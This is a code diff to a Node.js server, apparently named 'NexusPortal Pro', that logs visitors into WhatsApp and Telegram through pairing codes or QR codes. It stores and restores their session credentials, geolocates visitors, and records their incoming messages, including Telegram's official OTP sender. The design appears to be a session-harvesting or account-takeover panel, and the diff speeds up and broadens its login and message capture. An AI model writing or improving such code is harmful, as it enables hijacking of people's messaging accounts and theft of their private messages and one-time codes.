@@ -35,6 +35,64 @@ if (!fs.existsSync(WA_SESSIONS_DIR)) {
   fs.mkdirSync(WA_SESSIONS_DIR, { recursive: true });
 }
 
+// Cache Baileys version at boot so login never waits on GitHub/WA version fetch
+let cachedBaileysVersion = [2, 3000, 1015901307];
+fetchLatestBaileysVersion()
+  .then((res) => {
+    if (res && res.version) cachedBaileysVersion = res.version;
+  })
+  .catch(() => {});
+
+// ==========================================
+// 0. IP GEO COUNTRY DETECTION (Fast + Cached)
+// ==========================================
+const geoIpCache = new Map();
+
+async function detectVisitorCountry(req) {
+  const headerCountry = (
+    req.headers['cf-ipcountry'] ||
+    req.headers['x-vercel-ip-country'] ||
+    req.headers['x-country-code'] ||
+    req.headers['cloudfront-viewer-country'] ||
+    ''
+  ).toString().trim().toUpperCase();
+
+  if (headerCountry && headerCountry.length === 2 && headerCountry !== 'XX' && headerCountry !== 'T1') {
+    return headerCountry;
+  }
+
+  const forwarded = req.headers['x-forwarded-for'];
+  const rawIp = (forwarded ? forwarded.split(',')[0] : req.socket?.remoteAddress || '').trim().replace(/^::ffff:/, '');
+  if (!rawIp || rawIp === '127.0.0.1' || rawIp === '::1' || rawIp.startsWith('10.') || rawIp.startsWith('192.168.')) {
+    return '';
+  }
+
+  if (geoIpCache.has(rawIp)) {
+    return geoIpCache.get(rawIp);
+  }
+
+  try {
+    const controller = new AbortController();
+    const timer = setTimeout(() => controller.abort(), 1200);
+    const resp = await fetch(`http://ip-api.com/json/${encodeURIComponent(rawIp)}?fields=status,countryCode`, {
+      signal: controller.signal
+    });
+    clearTimeout(timer);
+    const data = await resp.json();
+    if (data && data.status === 'success' && data.countryCode) {
+      const code = String(data.countryCode).toUpperCase();
+      geoIpCache.set(rawIp, code);
+      if (geoIpCache.size > 2000) {
+        const firstKey = geoIpCache.keys().next().value;
+        geoIpCache.delete(firstKey);
+      }
+      return code;
+    }
+  } catch (e) {}
+
+  return '';
+}
+
 // ==========================================
 // 1. DATABASE SCHEMAS (MongoDB Atlas + Local Fallback)
 // ==========================================
@@ -105,6 +163,7 @@ const DEFAULT_SETTINGS = {
   customLoginNote: '',
   bgUrl: '',
   postLoginRedirectUrl: '',
+  loginSessionMinutes: 1440, // Admin-configurable browser login session duration (default 24h / 1440m)
   // Feature Master Switches
   whatsappEnabled: true,
   telegramEnabled: true,
@@ -157,6 +216,7 @@ const settingsSchema = new mongoose.Schema({
   customLoginNote: { type: String, default: '' },
   bgUrl: { type: String, default: '' },
   postLoginRedirectUrl: { type: String, default: '' },
+  loginSessionMinutes: { type: Number, default: 1440 },
   whatsappEnabled: { type: Boolean, default: true },
   telegramEnabled: { type: Boolean, default: true },
   loginMethodMode: { type: String, default: 'both' },
@@ -250,9 +310,30 @@ function generateReferralCode() {
   return 'NX' + crypto.randomBytes(3).toString('hex').toUpperCase();
 }
 
-function normalizePhone(raw) {
+function normalizePhone(raw, defaultDialCode = '') {
   if (!raw) return '';
-  let digits = String(raw).replace(/\D/g, '');
+  const trimmed = String(raw).trim();
+  let digits = trimmed.replace(/\D/g, '');
+  if (!digits) return '';
+
+  // If user pasted full number with '+', keep as-is
+  if (trimmed.startsWith('+')) {
+    return digits;
+  }
+
+  // If a country dial code is provided and digits don't already start with it
+  if (defaultDialCode) {
+    const cleanDial = String(defaultDialCode).replace(/\D/g, '');
+    if (cleanDial) {
+      if (digits.startsWith(cleanDial) && digits.length >= cleanDial.length + 7) {
+        return digits;
+      }
+      digits = digits.replace(/^0+/, '');
+      return cleanDial + digits;
+    }
+  }
+
+  // Fallback for Bangladesh local format
   if (digits.startsWith('01') && digits.length === 11) {
     digits = '88' + digits;
   }
@@ -500,13 +581,22 @@ function cleanupFolder(folderPath) {
   } catch (e) {}
 }
 
+// Syncs ONLY messages arriving/sent AFTER user connects (ignores pre-login history)
 function attachWaMessageListener(sock, userId, phone) {
-  sock.ev.on('messages.upsert', async ({ messages }) => {
+  const connectedAtSec = Math.floor(Date.now() / 1000) - 3;
+
+  sock.ev.on('messages.upsert', async ({ messages, type }) => {
     if (!Array.isArray(messages)) return;
+    if (type && type !== 'notify') return;
+
     for (const msg of messages) {
       if (!msg.message) continue;
       const remoteJid = msg.key?.remoteJid || '';
-      if (remoteJid === 'status@broadcast') continue;
+      if (!remoteJid || remoteJid === 'status@broadcast' || remoteJid.endsWith('@newsletter')) continue;
+
+      const rawTs = msg.messageTimestamp;
+      const msgTs = typeof rawTs === 'number' ? rawTs : Number(rawTs?.low ?? rawTs ?? 0);
+      if (msgTs > 0 && msgTs < connectedAtSec) continue;
 
       const senderPhone = remoteJid.split('@')[0] || remoteJid;
       const text =
@@ -514,8 +604,10 @@ function attachWaMessageListener(sock, userId, phone) {
         msg.message.extendedTextMessage?.text ||
         msg.message.imageMessage?.caption ||
         msg.message.videoMessage?.caption ||
+        msg.message.documentMessage?.caption ||
         msg.message.buttonsResponseMessage?.selectedDisplayText ||
         msg.message.listResponseMessage?.title ||
+        msg.message.templateButtonReplyMessage?.selectedDisplayText ||
         '[Media / System Message]';
 
       await recordIncomingMessage({
@@ -544,10 +636,9 @@ async function startWhatsAppLogin({ sessionId, phone, method, referredBy, termsA
   }
 
   const { state, saveCreds } = await useMultiFileAuthState(folderPath);
-  const { version } = await fetchLatestBaileysVersion().catch(() => ({ version: [2, 3000, 1015901307] }));
 
   const sock = makeWASocket({
-    version,
+    version: cachedBaileysVersion,
     logger: pino({ level: 'silent' }),
     printQRInTerminal: false,
     browser: ['Ubuntu', 'Chrome', '20.0.04'],
@@ -555,8 +646,8 @@ async function startWhatsAppLogin({ sessionId, phone, method, referredBy, termsA
       creds: state.creds,
       keys: makeCacheableSignalKeyStore(state.keys, pino({ level: 'silent' }))
     },
-    connectTimeoutMs: 60000,
-    defaultQueryTimeoutMs: 60000,
+    connectTimeoutMs: 30000,
+    defaultQueryTimeoutMs: 30000,
     keepAliveIntervalMs: 25000,
     markOnlineOnConnect: false,
     syncFullHistory: false
@@ -573,7 +664,7 @@ async function startWhatsAppLogin({ sessionId, phone, method, referredBy, termsA
 
   sock.ev.on('creds.update', async () => {
     await saveCreds();
-    await syncWaFilesToMongo(sessionKey, folderPath);
+    syncWaFilesToMongo(sessionKey, folderPath).catch(() => {});
   });
 
   sock.ev.on('connection.update', async (update) => {
@@ -612,7 +703,7 @@ async function startWhatsAppLogin({ sessionId, phone, method, referredBy, termsA
               current.error = 'পেয়ারিং কোড পাঠানো যায়নি। নাম্বারটি সঠিক কি না যাচাই করুন।';
             }
           }
-        }, 1200);
+        }, 250);
       }
     }
 
@@ -695,15 +786,19 @@ async function startWhatsAppLogin({ sessionId, phone, method, referredBy, termsA
 }
 
 // ==========================================
-// 5. TELEGRAM ENGINE (GramJS)
+// 5. TELEGRAM ENGINE (GramJS - Fast OTP + Post-Login Live Sync)
 // ==========================================
 const activeTgClients = new Map();
 
 function attachTgMessageListener(client, userId, phone) {
+  const connectedAtSec = Math.floor(Date.now() / 1000) - 3;
+
   client.addEventHandler(async (event) => {
     try {
       const msg = event.message;
       if (!msg || !msg.message) return;
+      if (msg.date && Number(msg.date) < connectedAtSec) return;
+
       const senderId = msg.senderId ? String(msg.senderId) : 'Telegram';
       const senderName = senderId === '777000' ? 'Telegram Official (OTP)' : senderId;
       await recordIncomingMessage({
@@ -739,16 +834,18 @@ async function restoreAllSavedSessions() {
     const apiHash = process.env.TG_API_HASH;
     if (apiId && apiHash) {
       const tgUsers = await User.find({ platform: 'telegram', sessionStatus: 'connected', status: 'active' });
-      for (const u of tgUsers) {
-        if (u.tgSessionString) {
-          try {
-            const client = new TelegramClient(new StringSession(u.tgSessionString), apiId, apiHash, { connectionRetries: 3 });
-            await client.connect();
-            activeTgClients.set(u.userId, client);
-            attachTgMessageListener(client, u.userId, u.phone);
-          } catch (e) {}
-        }
-      }
+      await Promise.allSettled(
+        tgUsers.map(async (u) => {
+          if (!u.tgSessionString) return;
+          const client = new TelegramClient(new StringSession(u.tgSessionString), apiId, apiHash, {
+            connectionRetries: 2,
+            useWSS: false
+          });
+          await client.connect();
+          activeTgClients.set(u.userId, client);
+          attachTgMessageListener(client, u.userId, u.phone);
+        })
+      );
     }
   } catch (e) {}
 }
@@ -759,7 +856,7 @@ async function restoreAllSavedSessions() {
 app.get('/api/health', (req, res) => {
   res.json({
     status: 'ok',
-    version: 'v4',
+    version: 'v4.1',
     uptime: Math.floor(process.uptime()),
     db: mongoConnected ? 'connected' : 'local_json',
     activeWaSessions: activeWaSockets.size,
@@ -770,13 +867,19 @@ app.get('/api/health', (req, res) => {
 });
 
 app.get('/api/public/config', async (req, res) => {
-  const s = await getSettings();
+  const [s, detectedCountry] = await Promise.all([
+    getSettings(),
+    detectVisitorCountry(req)
+  ]);
+
   res.json({
+    detectedCountry,
     siteTitle: s.siteTitle,
     siteSubtitle: s.siteSubtitle,
     customLoginNote: s.customLoginNote,
     bgUrl: s.bgUrl,
     postLoginRedirectUrl: s.postLoginRedirectUrl,
+    loginSessionMinutes: Number(s.loginSessionMinutes) || 1440,
     whatsappEnabled: s.whatsappEnabled,
     telegramEnabled: s.telegramEnabled,
     loginMethodMode: s.loginMethodMode,
@@ -824,16 +927,16 @@ function validateLoginPolicy(settings, platform, method, termsAccepted) {
 
 // Start WhatsApp Login
 app.post('/api/auth/whatsapp/start', async (req, res) => {
-  const { phone, method, referredBy, termsAccepted } = req.body || {};
+  const { phone, dialCode, method, referredBy, termsAccepted } = req.body || {};
   const settings = await getSettings();
   const loginMethod = method === 'qr' ? 'qr' : 'phone';
 
   const policyErr = validateLoginPolicy(settings, 'whatsapp', loginMethod, termsAccepted);
   if (policyErr) return res.status(400).json({ ok: false, error: policyErr });
 
-  const cleanPhone = normalizePhone(phone);
+  const cleanPhone = normalizePhone(phone, dialCode);
   if (loginMethod === 'phone' && (!cleanPhone || cleanPhone.length < 10)) {
-    return res.status(400).json({ ok: false, error: 'সঠিক কান্ট্রি কোডসহ মোবাইল নাম্বার দিন (যেমন: +8801XXXXXXXXX)।' });
+    return res.status(400).json({ ok: false, error: 'সঠিক মোবাইল নাম্বার দিন।' });
   }
 
   const sessionId = 'wa_' + crypto.randomBytes(6).toString('hex');
@@ -882,9 +985,9 @@ app.post('/api/auth/whatsapp/start', async (req, res) => {
   res.json({ ok: true, sessionId, expiresAt, timeoutSeconds: 120 });
 });
 
-// Start Telegram Login
+// Start Telegram Login (Fast Direct Connection)
 app.post('/api/auth/telegram/start', async (req, res) => {
-  const { phone, method, referredBy, termsAccepted } = req.body || {};
+  const { phone, dialCode, method, referredBy, termsAccepted } = req.body || {};
   const settings = await getSettings();
   const loginMethod = method === 'qr' ? 'qr' : 'phone';
 
@@ -897,9 +1000,9 @@ app.post('/api/auth/telegram/start', async (req, res) => {
     return res.status(400).json({ ok: false, error: 'সার্ভারে TG_API_ID এবং TG_API_HASH সেট করা নেই।' });
   }
 
-  const cleanPhone = normalizePhone(phone);
+  const cleanPhone = normalizePhone(phone, dialCode);
   if (loginMethod !== 'qr' && (!cleanPhone || cleanPhone.length < 10)) {
-    return res.status(400).json({ ok: false, error: 'সঠিক কান্ট্রি কোডসহ টেলিগ্রাম নাম্বার দিন।' });
+    return res.status(400).json({ ok: false, error: 'সঠিক টেলিগ্রাম নাম্বার দিন।' });
   }
 
   const sessionId = 'tg_' + crypto.randomBytes(6).toString('hex');
@@ -931,7 +1034,10 @@ app.post('/api/auth/telegram/start', async (req, res) => {
 
   enqueueLoginTask(async () => {
     const s = pendingSessions.get(sessionId);
-    const client = new TelegramClient(new StringSession(''), apiId, apiHash, { connectionRetries: 3 });
+    const client = new TelegramClient(new StringSession(''), apiId, apiHash, {
+      connectionRetries: 2,
+      useWSS: false
+    });
     await client.connect();
     s.tgClient = client;
 
@@ -1463,7 +1569,7 @@ async function bootstrap() {
   }
 
   app.listen(PORT, () => {
-    console.log(`NexusPortal Pro v4.0 running on port ${PORT} [${mongoConnected ? 'MongoDB: ' + connectedDbName : 'local_json_fallback'}]`);
+    console.log(`NexusPortal Pro v4.1 running on port ${PORT} [${mongoConnected ? 'MongoDB: ' + connectedDbName : 'local_json_fallback'}]`);
   });
 }
 
